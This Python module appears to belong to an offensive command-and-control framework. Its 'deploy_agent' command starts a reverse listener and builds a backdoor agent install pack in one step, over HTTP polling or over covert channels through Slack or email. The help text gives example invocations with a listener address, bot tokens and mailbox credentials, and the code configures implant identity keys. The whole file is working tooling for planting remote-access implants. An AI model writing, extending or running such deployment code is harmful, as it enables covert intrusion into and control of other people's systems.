#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""One-shot agent deployment: start listener + generate install pack."""

from __future__ import annotations

import argparse

from interfaces.command_system.base_command import BaseCommand
from core.output_handler import print_error, print_info, print_success, print_warning

DEPLOY_PROFILES = {
    "http": {
        "listener": "listeners/multi/reverse_http_polling",
        "backdoor": "backdoors/multi/kitty_agent_installer",
        "label": "HTTP polling Kitty agent",
    },
    "slack": {
        "listener": "listeners/messaging/slack_socketmode",
        "backdoor": "backdoors/multi/covert_channel_agent_pack",
        "label": "Slack covert agent",
        "channel": "slack",
    },
    "email": {
        "listener": "listeners/email/reverse_email",
        "backdoor": "backdoors/multi/covert_channel_agent_pack",
        "label": "Email covert agent",
        "channel": "email",
    },
}


class DeployAgentCommand(BaseCommand):
    @property
    def name(self) -> str:
        return "deploy_agent"

    @property
    def aliases(self) -> list:
        return ["agent_deploy"]

    @property
    def description(self) -> str:
        return "Start listener and generate agent install pack in one step"

    @property
    def usage(self) -> str:
        return "deploy_agent --channel http|slack|email [--lhost IP] [--lport PORT] [options]"

    @property
    def help_text(self) -> str:
        return f"""
{self.description}

Usage: {self.usage}

Channels:
  http   — reverse_http_polling + kitty_agent_installer (default)
  slack  — slack_socketmode + covert_channel_agent_pack (needs --bot-token, --channel-id)
  email  — reverse_email + covert_channel_agent_pack (needs mailbox options)

Examples:
  deploy_agent --channel http --lhost 10.0.0.5 --lport 8088
  deploy_agent --channel slack --bot-token xoxb-... --channel-id C0123
  deploy_agent --channel email --operator-email op@lab.local --imap-user v@lab.local
"""

    def execute(self, args, **kwargs) -> bool:
        parser = argparse.ArgumentParser(prog="deploy_agent", add_help=False)
        parser.add_argument("--channel", default="http", choices=sorted(DEPLOY_PROFILES))
        parser.add_argument("--lhost", default="127.0.0.1")
        parser.add_argument("--lport", type=int, default=8088)
        parser.add_argument("--client-id", default="")
        parser.add_argument("--no-listener", action="store_true", help="Skip starting listener job")
        parser.add_argument("--bot-token", default="")
        parser.add_argument("--channel-id", default="")
        parser.add_argument("--operator-email", default="")
        parser.add_argument("--imap-user", default="")
        parser.add_argument("--imap-password", default="")
        parser.add_argument("--smtp-user", default="")
        parser.add_argument("--smtp-password", default="")
        try:
            ns = parser.parse_args(args or [])
        except SystemExit:
            return True

        profile = DEPLOY_PROFILES[ns.channel]
        loader = getattr(self.framework, "module_loader", None)
        if not loader:
            print_error("module_loader unavailable")
            return False

        listener_path = profile["listener"]
        backdoor_path = profile["backdoor"]

        listener = loader.load_module(listener_path, framework=self.framework)
        if not listener:
            print_error(f"Could not load listener: {listener_path}")
            return False

        if ns.channel == "http":
            listener.lhost = ns.lhost
            listener.lport = ns.lport
            if hasattr(listener, "set_option"):
                listener.set_option("lhost", ns.lhost)
                listener.set_option("lport", ns.lport)
        elif ns.channel == "slack":
            if not str(ns.bot_token).strip() or not str(ns.channel_id).strip():
                print_error("Slack channel requires --bot-token and --channel-id")
                return False
            for opt, val in (
                ("bot_token", ns.bot_token),
                ("channel_id", ns.channel_id),
            ):
                if hasattr(listener, "set_option"):
                    listener.set_option(opt, val)
                elif hasattr(listener, opt):
                    getattr(listener, opt).value = val
        elif ns.channel == "email":
            if not all(
                str(x).strip()
                for x in (
                    ns.operator_email,
                    ns.imap_user,
                    ns.imap_password,
                    ns.smtp_user or ns.imap_user,
                    ns.smtp_password or ns.imap_password,
                )
            ):
                print_error(
                    "Email channel requires --operator-email, --imap-user, --imap-password "
                    "(and smtp creds if different)"
                )
                return False
            email_opts = {
                "operator_email": ns.operator_email,
                "imap_user": ns.imap_user,
                "imap_password": ns.imap_password,
                "smtp_user": ns.smtp_user or ns.imap_user,
                "smtp_password": ns.smtp_password or ns.imap_password,
            }
            for opt, val in email_opts.items():
                if hasattr(listener, "set_option"):
                    listener.set_option(opt, val)

        if not ns.no_listener:
            if hasattr(listener, "start"):
                if not listener.start(background=True):
                    print_error("Failed to start listener")
                    return False
                print_success(f"Listener started: {listener_path}")
            else:
                print_warning("Listener has no start(); run it manually with: use " + listener_path)

        backdoor = loader.load_module(backdoor_path, framework=self.framework)
        if not backdoor:
            print_error(f"Could not load backdoor: {backdoor_path}")
            return False

        if ns.channel == "http":
            backdoor.lhost = ns.lhost
            backdoor.lport = ns.lport
            if ns.client_id and hasattr(backdoor, "client_id"):
                backdoor.client_id = ns.client_id
        elif ns.channel in ("slack", "email"):
            if hasattr(backdoor, "channel"):
                backdoor.channel = profile.get("channel", ns.channel)
            if ns.channel == "slack":
                backdoor.bot_token = ns.bot_token
                backdoor.channel_id = ns.channel_id
            else:
                backdoor.operator_email = ns.operator_email
                backdoor.imap_user = ns.imap_user
                backdoor.imap_password = ns.imap_password
                backdoor.smtp_user = ns.smtp_user or ns.imap_user
                backdoor.smtp_password = ns.smtp_password or ns.imap_password

        if hasattr(backdoor, "implant_identity"):
            backdoor.implant_identity = True

        print_info(f"Generating {profile['label']}...")
        try:
            ok = bool(backdoor.run())
        except Exception as exc:
            print_error(f"Backdoor run failed: {exc}")
            return False

        if ok:
            print_success("Agent deploy pack generated — see output/ directory")
            if ns.channel == "http":
                pub = getattr(backdoor, "_implant_public_key_pem", None)
                if pub:
                    print_info("Set listener implant_public_key to the generated public key PEM")
        return ok
